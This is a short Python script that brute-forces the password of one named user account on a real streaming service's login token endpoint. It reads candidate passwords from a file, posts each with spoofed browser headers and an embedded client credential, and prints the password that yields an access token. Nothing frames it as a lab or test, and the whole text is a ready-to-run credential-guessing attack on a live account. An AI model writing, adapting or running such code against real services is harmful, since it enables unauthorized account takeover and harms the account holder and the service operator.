import requests
import time
import os
passinpot = open('test.txt', 'r').readlines()
for line in passinpot:
  a = line.strip()
  headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Authorization': 'Basic TmV3LkNpbmVtYW5hLmlkOlBAc3N3b3Jk',
    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'Origin': 'https://cinemana.shabakaty.com',
    'Connection': 'keep-alive',
    'Referer': 'https://cinemana.shabakaty.com/landing',
}
  data = {
  'grant_type': 'password',
  'scope': 'openid earthlink.profile offline_access fileservice',
  'username': 'mustafakmal',
  'password': a
}
  http = requests.post('https://account.shabakaty.com/core/connect/token/', headers=headers, data=data)
  print(http.text)
  if 'invalid_username_or_password' in http.text:
     print('error')
  if 'access_token' in http.text:
      print(a)
      break